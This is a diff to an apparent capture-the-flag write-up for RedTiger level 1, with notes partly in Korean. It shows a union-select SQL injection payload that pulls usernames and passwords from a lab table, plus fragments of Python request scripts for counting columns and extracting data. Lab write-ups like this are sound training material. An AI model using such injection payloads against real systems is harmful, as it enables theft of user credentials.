@@ -2,6 +2,8 @@
 [redtiger] level1
 ================================================================================================================
 
+|
+
 .. graphviz::
 
     digraph G {
@@ -12,26 +14,30 @@
         {
             rank="same";
             "client"[shape="plaintext"];
-            "client" -> step0 -> step2 -> step4;
+            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
         }
 
         {
             rank="same";
             "server"[shape="plaintext"];
-            "server" -> step1 -> step3 -> step5;
+            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="level1.php?cat=1 union select 1,2,username,password from level1_users",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="post_data: {cat=1 union select %s from level1_users}",arrowhead="normal"];
+        step3 -> step2[label="Column Length",arrowhead="normal"];
+        step4 -> step5[label="post_data: {cat=1 union select 1,2,username,password from level1_users}",arrowhead="normal"];
+        step7 -> step6[label="Data Extract",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+취약점 존재 여부 확인
 ================================================================================================================
 
-- Target: Get the login for the user Hornoxe 
-- Hint: You really need one? omg -_- 
-- Tablename: level1_users
+- GET 페이지 취약점
+- GET 파라미터: cat
+- MySQL, Union Select Injection
+- 테이블명: level1_users
+
 
 .. code-block:: html
 
@@ -48,6 +54,8 @@ Source Analysis
 
 Column Length
 ================================================================================================================
+
+- 컬럼 개수 확인
 
 .. code-block:: python
 
@@ -73,6 +81,8 @@ Column Length
 Data Extract
 ================================================================================================================
 
+- 데이터 추출
+
 .. code-block:: python
 
     import requests
@@ -88,3 +98,4 @@ Data Extract
     r = requests.get(url, params=params, verify=False)
     print r.content
 
+|
